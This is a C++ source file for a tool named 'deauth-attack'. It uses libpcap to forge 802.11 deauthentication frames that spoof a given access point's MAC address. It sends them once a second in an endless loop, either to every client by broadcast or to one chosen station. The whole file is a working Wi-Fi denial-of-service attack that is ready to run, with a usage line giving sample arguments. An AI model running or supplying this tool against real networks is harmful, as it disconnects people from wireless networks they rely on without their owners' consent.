#include <iostream>
#include <cstdio>
#include <pcap.h>
#include <netinet/in.h>
#include <net/if.h>
#include <unistd.h>
#include "deauth_packet.h"
void usage(){
    std::cout<<"syntx : deauth-attack <interface> <ap mac>"<<std::endl;
    std::cout<<"sample : deauth-attack wlan0 00:11:22:33:44:55 66:77:88:99:AA:BB";
}
void hextomac(uint8_t * address){

    unsigned char mac[6];
    memcpy(mac,address,6);
    for(int i=0 ; i<6; i++){
        printf("%02x",mac[i]);
        if(i!=5){
            printf(":");
        }
    }

}
int main(int argc, char *argv[])
{
    char *dev;
    Deauth_Packet deauth_packet;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle;
    switch(argc){
        case 3:
            dev=argv[1];
            handle= pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
                if (handle == nullptr) {
                    fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
                    return -1;
                }
            deauth_packet.radiotap_header.it_len=9;


            deauth_packet.radiotap_header.it_present=0x00000004;
            deauth_packet.radiotap_header.rate=0x02;
            deauth_packet.dot11_frame.frame_control.protocol=0;
            deauth_packet.dot11_frame.frame_control.type=management;
            deauth_packet.dot11_frame.frame_control.subtype=Frame_control::Management::Deauthentication;
            deauth_packet.dot11_frame.frame_control.to_ds=0;
            deauth_packet.dot11_frame.frame_control.from_ds=0;
            deauth_packet.dot11_frame.frame_control.more_flag=0;
            deauth_packet.dot11_frame.frame_control.retry=0;
            deauth_packet.dot11_frame.frame_control.powermgmt=0;
            deauth_packet.dot11_frame.frame_control.more_data=0;
            deauth_packet.dot11_frame.frame_control.protected_frame=0;
            deauth_packet.dot11_frame.frame_control.order=0;
            deauth_packet.dot11_frame.address_1=Mac("ff:ff:ff:ff:ff:ff");
            deauth_packet.dot11_frame.address_2=Mac(argv[2]);
            deauth_packet.dot11_frame.address_3=Mac(argv[2]);
            deauth_packet.dot11_frame.sequence_control=0x701f;


            while(1){
                int res=pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&deauth_packet),sizeof(deauth_packet));
                sleep(1);
            }
        break;
       case 4:
        dev=argv[1];
        handle= pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
            if (handle == nullptr) {
                fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
                return -1;
            }
        deauth_packet.radiotap_header.it_len=9;


        deauth_packet.radiotap_header.it_present=0x00000004;
        deauth_packet.radiotap_header.rate=0x02;
        deauth_packet.dot11_frame.frame_control.protocol=0;
        deauth_packet.dot11_frame.frame_control.type=management;
        deauth_packet.dot11_frame.frame_control.subtype=Frame_control::Management::Deauthentication;
        deauth_packet.dot11_frame.frame_control.to_ds=0;
        deauth_packet.dot11_frame.frame_control.from_ds=0;
        deauth_packet.dot11_frame.frame_control.more_flag=0;
        deauth_packet.dot11_frame.frame_control.retry=0;
        deauth_packet.dot11_frame.frame_control.powermgmt=0;
        deauth_packet.dot11_frame.frame_control.more_data=0;
        deauth_packet.dot11_frame.frame_control.protected_frame=0;
        deauth_packet.dot11_frame.frame_control.order=0;
        deauth_packet.dot11_frame.address_1=Mac(argv[3]);
        deauth_packet.dot11_frame.address_2=Mac(argv[2]);
        deauth_packet.dot11_frame.address_3=Mac(argv[2]);
        deauth_packet.dot11_frame.sequence_control=0x701f;


        while(1){
            int res=pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&deauth_packet),sizeof(deauth_packet));
            sleep(1);
        }
        break;
    default:
        usage();
        break;
    }
}
